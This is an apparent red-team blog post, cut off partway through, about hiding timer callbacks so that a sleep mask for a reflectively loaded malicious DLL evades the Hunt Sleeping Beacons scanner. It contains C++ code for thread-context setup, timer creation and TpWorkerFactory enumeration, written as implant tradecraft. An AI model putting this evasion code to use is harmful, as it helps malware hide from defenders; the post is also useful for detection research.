# https://oldboy21.github.io/posts/2024/09/timer-callbacks-spoofing-to-improve-your-sleap-and-swappala-untold/

<!DOCTYPE html><html lang="en" data-theme="light"><body><div class="container"><div class="content"><main class="post"><div class="post-info"><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>14 minutes</p></div><article><h1 class="post-title"><a href="https://oldboy21.github.io/posts/2024/09/timer-callbacks-spoofing-to-improve-your-sleap-and-swappala-untold/">Timer Callbacks Spoofing to Improve your SLEAP and SWAPPALA Untold</a></h1><div class="post-content"><p>Hello, Hello, Aloooooooo. After some time away from coding I am here again talking about sleeping masks. Thanks to the great cybersec community there is always something to work on üòÑ</p><p>Last time in my blog I have talked how to hide a memory mapping (where in my case a ReflectiveDLL is loaded) from memory scanners. Particularly, <a href="https://oldboy21.github.io/posts/2024/06/sleaping-issues-swappala-and-reflective-dll-friends-forever/">SLEAPING</a> and <a href="https://oldboy21.github.io/posts/2024/05/swappala-why-change-when-you-can-hide/">SWAPPALA</a> techniques are used to swap the malicious mapping with a legit Microsoft DLL at the same address, at sleeping time. That being done via Timers that invoke ‚ÄúResumeThread‚Äù function to wake up suspended worker threads.</p><p>All of that was working pretty well, still it was leaving some IOC behind: The great <a href="https://github.com/thefLink/Hunt-Sleeping-Beacons">Hunt Sleeping Beacons</a> tool by <a href="https://twitter.com/thefLinkk">thefLink</a> was in fact noticing a thing or two üëÄ</p><h2 id="disclaimer">Disclaimer</h2><p>In this blog post I will touch arguments like Worker threads, Timers and Asynchronous Procedures Calls. I will not dive into what those are and specifically how they work, but only how I used them in order to achieve my goals. Said that, if you are not familiar with those concept I would suggest to take a look at that first üôèüèº</p><h2 id="the-detection">The Detection</h2><img src="https://oldboy21.github.io/timerspoof/image.png" class="center"><p>Starting from the most important detection that inspired this whole work: ‚ÄúA suspicious timer callback was identified pointing to kernel32!ResumeThread‚Äù</p><img src="https://media0.giphy.com/media/3o6wrebnKWmvx4ZBio/giphy.gif?cid=7941fdc69ek73o90diqbmczn8j0sl8y7teydxpu6z79r2wjb&amp;ep=v1_gifs_search&amp;rid=giphy.gif&amp;ct=g" class="center" alt="animated"><p>Very interesting finding. So the Hunt Sleeping Beacons tool (next referred as HSB) also looks for timer callbacks. For those not too familiar with this concept: a timer callback is the function that is executed once a timer is expired. In SLEAPING many timers are created having ResumeThread as callback in order to trigger the SWAPPALA logic while the main thread is sleeping (definitely better information about this in my previous blogs).</p><p>Since what the HSB tool does is keeping a list of those ‚Äúmalicious callbacks‚Äù like blacklist approach, the first thought that someone might have is to swap the ResumeThread callback with another one that could achieve the same result and in fact temporary bypass the HSB check.</p><p>But that would become a cat&amp;mouse game wouldn‚Äôt it?</p><img src="https://media1.giphy.com/media/jyTk0vpfS0pyqkgpZu/giphy.gif?cid=7941fdc6r1upnoznfm9jsvi20qblstfnlr5egazkbhkvlqei&amp;ep=v1_gifs_search&amp;rid=giphy.gif&amp;ct=g" class="center" alt="animated"><h2 id="the-idea">The Idea</h2><p>At that point I thought, ok we do a lot of things at sleeping time, why not trying to implement something that hides those callbacks as well? Sneak peeking at the HSB code I have seen how to access to the ‚ÄúTpWorkerFactory‚Äù objects that are created once a timer is also created and figured how to potentially modify the callback address. A ‚ÄúTpWorkerFactory‚Äù object is created for each timer queue, diving into that object it is possible to reach a double linked list of structures where among the other things also the addresses of the callback are kept. Please refer to HSB code and also <a href="https://urien.gitbook.io/diago-lima/a-deep-dive-into-exploiting-windows-thread-pools/attacking-timer-queues">this great resource</a> to learn more about the structures mentioned before, it does not really fit here üòÑ</p><p>So the overall idea (at that point in time completely in my mind) was to have some ‚Äúgoing to sleep‚Äù chain that would look like this:</p><ol><li>Unmap Reflective DLL Mapping (Timer + ResumeThread)</li><li>Map Legit DLL (Timer + ResumeThread)</li><li>Hide Callbacks (Timer + ResumeThread)</li><li>Sleap (Just time between timers)</li><li>Fix Callbacks (??????)</li><li>Unamp Legit DLL (Timer + ResumeThread)</li><li>Map Reflective DLL Mapping (Timer + ResumeThread)</li></ol><p>With a lot of question marks at point 5. Given that at step 3 all the callbacks disappeared (not allowing the timers to be triggered since the ‚ÄúTpWorkerFactory‚Äù object was in fact modified with a fake callback), point 5 could not be triggered and as conseguence also the point 6 and 7 making SLEAPING fail miserably. I had to think of a way to execute that point 5 without relying on Timers.</p><p>Brainstorming with myself for some time got me to the conclusion I could let <a href="https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls">APCs</a> join the battle</p><img src="https://media4.giphy.com/media/elsZ2K3WUFg9bObcSw/giphy.gif?cid=7941fdc6ts7qtkk9pry6viu0ozab18skm787wnxwcryyj7yr&amp;ep=v1_gifs_search&amp;rid=giphy.gif&amp;ct=g" class="center" alt="animated"><p>APCs are ‚Äúfunctions that executes asynchronously in the context of a particular thread (each thread has its own APCs queue)‚Äù, which is a concept really interesting in the context of Sleeping Masks, in fact already widely used in techniques like <a href="https://github.com/realoriginal/foliage">Foliage</a> quite some time ago. The main idea of these procedures is that once they are queued to a thread as tasks, as soon as the thread is in ‚Äú<a href="https://learn.microsoft.com/en-us/windows/win32/fileio/alertable-i-o">alertable</a>‚Äù state, it would start picking and executing the APCs in a FIFO order. Another small concept I will mention later is ‚ÄúEvents‚Äù. In Win32 programming in order to synchronize threads, Events can be used. As simply as it sounds, a thread can be hanging on an Event, till the event is in fact signaled (or triggered, whatever wording you like).</p><p>Having the opportunities to use these magic routines and objects, I have re-thought of my SLEAPING chain:</p><ol><li>Enumerate all the TpWorkerFactory objects for the process where the Reflective DLL is injected</li><li>Creating a queue of APCs for a thread (named ThreadHide) that would hang on an event (EventHide)</li><li>Creating a queue of APC for a thread (named ThreadFix) that would hang on an event (EventFix)</li><li>Unmap Reflective DLL Mapping (Timer + ResumeThread)</li><li>Map Legit DLL (Timer + ResumeThread)</li><li>Hide Callbacks (Timer + ResumeThread + SetEvent)</li><li>APCs for ThreadHide executed that would ‚Äú<a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory">WriteProcessMemory</a>‚Äù all the TpWorkerFactory object containing a callback to ResumeThread and finally SetEvent(EventFix)</li><li>APCs for ThreadFix executed that would Sleep first for ‚ÄúSleepingTime‚Äù and eventually ‚Äú<a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory">WriteProcessMemory</a>‚Äù all the ResumeThread callback back to where they belong</li><li>Unamp Legit DLL (Timer + ResumeThread)</li><li>Map the Reflective DLL Mapping (Timer + ResumeThread)</li></ol><p>Got tired only thinking about but it should work.</p><h2 id="the-code">The Code</h2><p>Before starting is important to mention that some of the code I used it‚Äôs been consulted and/or copied-pasta from the <a href="https://github.com/thefLink/Hunt-Sleeping-Beacons">HSB repository</a> (for what concerns the TpWorkerFactory enumeration) and from the awesome outstanding code base available in <a href="https://maldevacademy.com/">Maldev Academy</a> (for what concerns the APCs operations and Foliage explaination) in order to achieve my ideas. But let‚Äôs cut to the chase now.</p><p>The new version of Sleaping welcomes a new suspended thread (to execute the point 6)</p><div class="highlight"><div class="code-toolbar"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=" language-cpp"><code class=" language-cpp" data-lang="cpp"><span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>

<span class="token comment">//SLEPING threads contexts</span>
<span class="token operator">*</span><span class="token punctuation">(</span>ULONG_PTR<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>context<span class="token punctuation">)</span><span class="token punctuation">.</span>Rsp<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>ExitThread<span class="token punctuation">;</span>
<span class="token punctuation">(</span><span class="token operator">*</span>context<span class="token punctuation">)</span><span class="token punctuation">.</span>Rip <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>UnmapViewOfFile<span class="token punctuation">;</span>
<span class="token punctuation">(</span><span class="token operator">*</span>context<span class="token punctuation">)</span><span class="token punctuation">.</span>Rcx <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token punctuation">(</span>ImageBaseDLL<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token operator">*</span><span class="token punctuation">(</span>ULONG_PTR<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>contextB<span class="token punctuation">)</span><span class="token punctuation">.</span>Rsp<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>ExitThread<span class="token punctuation">;</span>
<span class="token punctuation">(</span><span class="token operator">*</span>contextB<span class="token punctuation">)</span><span class="token punctuation">.</span>Rip <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>MapViewOfFileEx<span class="token punctuation">;</span>
<span class="token punctuation">(</span><span class="token operator">*</span>contextB<span class="token punctuation">)</span><span class="token punctuation">.</span>Rcx <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>sacDllHandle<span class="token punctuation">;</span>
<span class="token punctuation">(</span><span class="token operator">*</span>contextB<span class="token punctuation">)</span><span class="token punctuation">.</span>Rdx <span class="token operator">=</span> FILE_MAP_ALL_ACCESS<span class="token punctuation">;</span>
<span class="token punctuation">(</span><span class="token operator">*</span>contextB<span class="token punctuation">)</span><span class="token punctuation">.</span>R8 <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token number">0x00</span><span class="token punctuation">;</span>
<span class="token punctuation">(</span><span class="token operator">*</span>contextB<span class="token punctuation">)</span><span class="token punctuation">.</span>R9 <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token number">0x00</span><span class="token punctuation">;</span>
<span class="token operator">*</span><span class="token punctuation">(</span>ULONG_PTR<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>contextB<span class="token punctuation">)</span><span class="token punctuation">.</span>Rsp <span class="token operator">+</span> <span class="token number">40</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span> <span class="token comment">//the offset must be either hex 28 or int 40</span>
<span class="token operator">*</span><span class="token punctuation">(</span>ULONG_PTR<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>contextB<span class="token punctuation">)</span><span class="token punctuation">.</span>Rsp <span class="token operator">+</span> <span class="token number">48</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span>ImageBaseDLL<span class="token punctuation">;</span>

<span class="token operator">*</span><span class="token punctuation">(</span>ULONG_PTR<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>contextC<span class="token punctuation">)</span><span class="token punctuation">.</span>Rsp<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>ExitThread<span class="token punctuation">;</span>
<span class="token punctuation">(</span><span class="token operator">*</span>contextC<span class="token punctuation">)</span><span class="token punctuation">.</span>Rip <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>UnmapViewOfFile<span class="token punctuation">;</span>
<span class="token punctuation">(</span><span class="token operator">*</span>contextC<span class="token punctuation">)</span><span class="token punctuation">.</span>Rcx <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token punctuation">(</span>ImageBaseDLL<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token operator">*</span><span class="token punctuation">(</span>ULONG_PTR<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>contextD<span class="token punctuation">)</span><span class="token punctuation">.</span>Rsp<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>ExitThread<span class="token punctuation">;</span>
<span class="token punctuation">(</span><span class="token operator">*</span>contextD<span class="token punctuation">)</span><span class="token punctuation">.</span>Rip <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>MapViewOfFileEx<span class="token punctuation">;</span>
<span class="token punctuation">(</span><span class="token operator">*</span>contextD<span class="token punctuation">)</span><span class="token punctuation">.</span>Rcx <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>malDllHandle<span class="token punctuation">;</span>
<span class="token punctuation">(</span><span class="token operator">*</span>contextD<span class="token punctuation">)</span><span class="token punctuation">.</span>Rdx <span class="token operator">=</span> FILE_MAP_ALL_ACCESS <span class="token operator">|</span> FILE_MAP_EXECUTE<span class="token punctuation">;</span>
<span class="token punctuation">(</span><span class="token operator">*</span>contextD<span class="token punctuation">)</span><span class="token punctuation">.</span>R8 <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token number">0x00</span><span class="token punctuation">;</span>
<span class="token punctuation">(</span><span class="token operator">*</span>contextD<span class="token punctuation">)</span><span class="token punctuation">.</span>R9 <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token number">0x00</span><span class="token punctuation">;</span>
<span class="token operator">*</span><span class="token punctuation">(</span>ULONG_PTR<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>contextD<span class="token punctuation">)</span><span class="token punctuation">.</span>Rsp <span class="token operator">+</span> <span class="token number">40</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span> <span class="token comment">//the offset must be either hex 28 or int 40</span>
<span class="token operator">*</span><span class="token punctuation">(</span>ULONG_PTR<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>contextD<span class="token punctuation">)</span><span class="token punctuation">.</span>Rsp <span class="token operator">+</span> <span class="token number">48</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span>ImageBaseDLL<span class="token punctuation">;</span>

<span class="token comment">//latest arrival for Sleepmasking spoofing</span>
<span class="token operator">*</span><span class="token punctuation">(</span>ULONG_PTR<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>contextE<span class="token punctuation">)</span><span class="token punctuation">.</span>Rsp<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>ExitThread<span class="token punctuation">;</span>
<span class="token punctuation">(</span><span class="token operator">*</span>contextE<span class="token punctuation">)</span><span class="token punctuation">.</span>Rip <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>SetEvent<span class="token punctuation">;</span>
<span class="token punctuation">(</span><span class="token operator">*</span>contextE<span class="token punctuation">)</span><span class="token punctuation">.</span>Rcx <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token punctuation">(</span>EvntHide<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><span>C++</span></div></div></div></div><p>In total 5 Timers are created within the same TimerQueue:</p><div class="highlight"><div class="code-toolbar"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=" language-cpp"><code class=" language-cpp" data-lang="cpp"> <span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>
 
 <span class="token function">CreateTimerQueueTimer</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>hNewTimer<span class="token punctuation">,</span> hTimerQueue<span class="token punctuation">,</span> <span class="token punctuation">(</span>WAITORTIMERCALLBACK<span class="token punctuation">)</span>ResumeThreadAddress<span class="token punctuation">,</span> ThreadArray<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> WT_EXECUTEINTIMERTHREAD<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//unamp</span>
 <span class="token function">CreateTimerQueueTimer</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>hNewTimer<span class="token punctuation">,</span> hTimerQueue<span class="token punctuation">,</span> <span class="token punctuation">(</span>WAITORTIMERCALLBACK<span class="token punctuation">)</span>ResumeThreadAddress<span class="token punctuation">,</span> ThreadArray<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1100</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> WT_EXECUTEINTIMERTHREAD<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//mapsac</span>
 <span class="token function">CreateTimerQueueTimer</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>hNewTimer<span class="token punctuation">,</span> hTimerQueue<span class="token punctuation">,</span> <span class="token punctuation">(</span>WAITORTIMERCALLBACK<span class="token punctuation">)</span>ResumeThreadAddress<span class="token punctuation">,</span> ThreadArray<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> WT_EXECUTEINTIMERTHREAD<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//hide callbacks</span>
 <span class="token function">CreateTimerQueueTimer</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>hNewTimer<span class="token punctuation">,</span> hTimerQueue<span class="token punctuation">,</span> <span class="token punctuation">(</span>WAITORTIMERCALLBACK<span class="token punctuation">)</span>ResumeThreadAddress<span class="token punctuation">,</span> ThreadArray<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">20000</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> WT_EXECUTEINTIMERTHREAD<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//unmap</span>
 <span class="token function">CreateTimerQueueTimer</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>hNewTimer<span class="token punctuation">,</span> hTimerQueue<span class="token punctuation">,</span> <span class="token punctuation">(</span>WAITORTIMERCALLBACK<span class="token punctuation">)</span>ResumeThreadAddress<span class="token punctuation">,</span> ThreadArray<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">20100</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> WT_EXECUTEINTIMERTHREAD<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//mapma</span>
 
 <span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><span>C++</span></div></div></div></div><p>Once the Timers are created the ResumeThread callback chase starts (parts of variables declaration is omitted to leave more space and importance to the logic of things):</p><div class="highlight"><div class="code-toolbar"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=" language-cpp"><code class=" language-cpp" data-lang="cpp"><span class="token comment">//original unmodified version can be found here</span>
<span class="token comment">//https://github.com/thefLink/Hunt-Sleeping-Beacons/blob/main/src/EnumerateSuspiciousTimers.cpp</span>
<span class="token keyword">int</span> <span class="token function">EnumResumeThreadCallbacks</span><span class="token punctuation">(</span>PVOID ResumeThreadAddress<span class="token punctuation">,</span> PTPP_CLEANUP_GROUP_MEMBER<span class="token operator">*</span> callbackArray<span class="token punctuation">)</span> <span class="token punctuation">{</span>

<span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>
    
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>status <span class="token operator">=</span> <span class="token function">NtQuerySystemInformation</span><span class="token punctuation">(</span>
        SystemHandleInformation<span class="token punctuation">,</span>
        buffer<span class="token punctuation">,</span>
        bufferSize<span class="token punctuation">,</span>
        <span class="token constant">NULL</span>
    <span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> STATUS_INFO_LENGTH_MISMATCH<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">VirtualFree</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> MEM_RELEASE<span class="token punctuation">)</span><span class="token punctuation">;</span>
        buffer <span class="token operator">=</span> <span class="token punctuation">(</span>PSYSTEM_HANDLE_INFORMATION<span class="token punctuation">)</span><span class="token function">VirtualAlloc</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> bufferSize <span class="token operator">*=</span> <span class="token number">2</span><span class="token punctuation">,</span> MEM_COMMIT <span class="token operator">|</span> MEM_RESERVE<span class="token punctuation">,</span> PAGE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    PSYSTEM_HANDLE_INFORMATION handleInfo <span class="token operator">=</span> <span class="token punctuation">(</span>PSYSTEM_HANDLE_INFORMATION<span class="token punctuation">)</span>buffer<span class="token punctuation">;</span>
    POBJECT_TYPE_INFORMATION objectTypeInfo<span class="token punctuation">;</span>
    ULONG returnLength<span class="token punctuation">;</span>
    objectTypeInfo <span class="token operator">=</span> <span class="token punctuation">(</span>POBJECT_TYPE_INFORMATION<span class="token punctuation">)</span><span class="token function">VirtualAlloc</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">,</span> MEM_COMMIT <span class="token operator">|</span> MEM_RESERVE<span class="token punctuation">,</span> PAGE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span>ULONG_PTR i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> handleInfo<span class="token operator">-&gt;</span>HandleCount<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

        SYSTEM_HANDLE handle <span class="token operator">=</span> handleInfo<span class="token operator">-&gt;</span>Handles<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>

        <span class="token comment">//for each handle i check whether it belongs to my process</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>handle<span class="token punctuation">.</span>ProcessId <span class="token operator">==</span> <span class="token function">GetProcessId</span><span class="token punctuation">(</span><span class="token function">GetCurrentProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">NtQueryObject</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>handle<span class="token punctuation">.</span>Handle<span class="token punctuation">,</span> ObjectTypeInformation<span class="token punctuation">,</span> objectTypeInfo<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>OBJECT_TYPE_INFORMATION<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

                <span class="token keyword">continue</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token comment">//if it's a TpWorkerFactory object I enumerate further</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">lstrcmpW</span><span class="token punctuation">(</span>objectTypeInfo<span class="token operator">-&gt;</span>Name<span class="token punctuation">.</span>Buffer<span class="token punctuation">,</span> L<span class="token string">"TpWorkerFactory"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

                <span class="token comment">//check function below</span>
                <span class="token function">GetInfoFromWorkerFactory</span><span class="token punctuation">(</span><span class="token punctuation">(</span>HANDLE<span class="token punctuation">)</span>handle<span class="token punctuation">.</span>Handle<span class="token punctuation">,</span> ResumeThreadAddress<span class="token punctuation">,</span> <span class="token operator">&amp;</span>arraySize<span class="token punctuation">,</span> callbackArray<span class="token punctuation">)</span><span class="token punctuation">;</span>

                <span class="token comment">//Found the right TpWorkerFactory</span>
                <span class="token comment">//5 is the number of timers I have created</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>arraySize <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>buffer<span class="token punctuation">)</span> <span class="token function">VirtualFree</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> MEM_RELEASE<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                arraySize <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">//original unmodified version can be found here</span>
<span class="token comment">//https://github.com/thefLink/Hunt-Sleeping-Beacons/blob/main/src/EnumerateSuspiciousTimers.cpp</span>
VOID<span class="token operator">*</span> <span class="token function">GetInfoFromWorkerFactory</span><span class="token punctuation">(</span>HANDLE hWorkerFactory<span class="token punctuation">,</span> PVOID ResumeThreadAddress<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">*</span> arraySize<span class="token punctuation">,</span> PTPP_CLEANUP_GROUP_MEMBER<span class="token operator">*</span> callbackArray<span class="token punctuation">)</span> <span class="token punctuation">{</span>

    <span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>
    
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">NtQueryInformationWorkerFactory</span><span class="token punctuation">(</span>hWorkerFactory<span class="token punctuation">,</span> WorkerFactoryBasicInformation<span class="token punctuation">,</span> <span class="token operator">&amp;</span>wfbi<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>WORKER_FACTORY_BASIC_INFORMATION<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token operator">==</span> STATUS_SUCCESS<span class="token punctuation">)</span> <span class="token punctuation">{</span>

        bSuccess <span class="token operator">=</span> <span class="token function">ReadProcessMemory</span><span class="token punctuation">(</span><span class="token function">GetCurrentProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> wfbi<span class="token punctuation">.</span>StartParameter<span class="token punctuation">,</span> <span class="token operator">&amp;</span>full_tp_pool<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>FULL_TP_POOL<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>bSuccess <span class="token operator">==</span> FALSE<span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>full_tp_pool<span class="token punctuation">.</span>TimerQueue<span class="token punctuation">.</span>RelativeQueue<span class="token punctuation">.</span>WindowStart<span class="token punctuation">.</span>Root<span class="token punctuation">)</span>
            p_tp_timer <span class="token operator">=</span> <span class="token function">CONTAINING_RECORD</span><span class="token punctuation">(</span>full_tp_pool<span class="token punctuation">.</span>TimerQueue<span class="token punctuation">.</span>RelativeQueue<span class="token punctuation">.</span>WindowStart<span class="token punctuation">.</span>Root<span class="token punctuation">,</span> FULL_TP_TIMER<span class="token punctuation">,</span> WindowStartLinks<span class="token punctuation">)</span><span class="token punctuation">;</span>
